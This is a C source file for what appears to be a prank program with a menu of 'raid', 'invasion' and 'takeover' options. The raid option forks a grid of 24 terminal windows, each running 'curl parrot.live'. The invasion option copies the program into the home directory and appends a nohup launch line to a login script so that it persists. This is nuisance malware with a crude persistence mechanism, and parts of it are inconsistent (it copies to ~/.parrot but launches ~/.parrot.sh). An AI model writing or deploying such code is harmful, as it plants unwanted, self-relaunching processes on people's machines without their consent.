// Big Header

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>

#include "frames.h"

#define CLEAR		"\033[H\033[J" 
#define CMD_WIDTH	50
#define CMD_HEIGHT	18

#define CHAR_WIDTH		13
#define CHAR_HEIGHT		31

#define DEBUG(message, ...)	fprintf(stderr, "DEBUG: %s:%d:%s(): " message "\n", __FILE__, __LINE__, __func__, ##__VA_ARGS__)
#define ERROR(message, ...)	fprintf(stderr, "ERROR: %s:%d:%s(): " message ": %s\n", __FILE__, __LINE__, __func__, ##__VA_ARGS__, strerror(errno))

enum e_action
{
	e_raid,
	e_invasion,
	e_takeover,
	e_cleaning,
	e_quit
};

/** */
int	_interface()
{
	int		action = -1;
	char	input[64];

	printf(
		CLEAR
		" _________________________ \n"
		"| what are we going to do |\n"
		"| 1 - sending a raid      |\n"
		"| 2 - make an invasion    |\n"
		"| 3 - take over this place|\n"
		"| q - quit                |\n"
		"|_________________________|\n"
	);

	while (action < 0)
	{
		write(STDOUT_FILENO, "\n>>> ", 5);
		fgets(input, sizeof(input), stdin);
		if (strncmp(input, "1", 1) == 0)
			action = e_raid;
		else if (strncmp(input, "2", 1) == 0)
			action = e_invasion;
		else if (strncmp(input, "3", 1) == 0)
			action = e_takeover;
		else if (strncmp(input, "q", 1) == 0)
			action = e_quit;
		else
			printf("Invalid action. Please try again.\n");
	}
	return (action);
}

int	_raid()
{
	const int	nb_col = 6;
	const int	nb_row = 4;
	int			i = 0, j = 0;
	int			X = 0, Y = 0;
	pid_t		pid;
	char		geometry[64];

	DEBUG("Number of columns: %d, Number of rows: %d", nb_col, nb_row);

	while (i < nb_row)
	{
		j = 0;
		while (j < nb_col)
		{
			pid = fork();
			if (pid == 0)
			{
				X = j * CMD_WIDTH * CHAR_WIDTH;
				Y = i * CMD_HEIGHT * CHAR_HEIGHT;
				snprintf(geometry, sizeof(geometry), "%dx%d+%d+%d", CMD_WIDTH, CMD_HEIGHT, X, Y);
				DEBUG("execlp: gnome-terminal --geometry %s -- bash -c 'curl parrot.live; exec bash'", geometry);
				execlp("gnome-terminal", "gnome-terminal",
					"--geometry", geometry,
					"--", "bash", "-c", "curl parrot.live; exec bash",
					(char *)NULL);

				perror("execlp");
				exit(1);
			}
			else if (pid > 0)
				++j;
			else
			{
				perror("fork");
				exit(1);
			}
		}
		++i;
	}
	DEBUG("Raid executed successfully.\n");
}

int	_invasion(
	const char *name
)
{
	char	buffer[256];
	pid_t	pid;

	sprintf(buffer, "cp %s ~/.parrot; echo 'nohup ~/.parrot.sh &' >> ~/login.sh", name);
	pid = fork();
	if (pid == 0)
	{
		execlp("bash", "bash", "-c", buffer, (char *)NULL);
		perror("execlp");
	}
	else if (pid > 0)
		_raid();
	else
		ERROR("fork failed");
	return (0);
}

int	_takeover()
{
	printf("Executing takeover...\n");
	return (0);
}

__attribute__((noreturn)) int	_quit(
	const char *const restrict name
)
{
	printf("Executing quit...\n");
	exit(0);
}

int	main(int argc, char *argv[])
{
	int	action = -1;

	action = _interface();
	switch (action)
	{
		case e_raid:
			_raid();
			break;
		case e_invasion:
			_invasion(argv[0]);
			break;
		case e_takeover:
			_takeover();
			break;
		case e_quit:
			_quit(argv[0]);
			break;
		default:
			printf("Invalid action. Please try again.\n");
			action = -1;
	}
	_quit(argv[0]);
}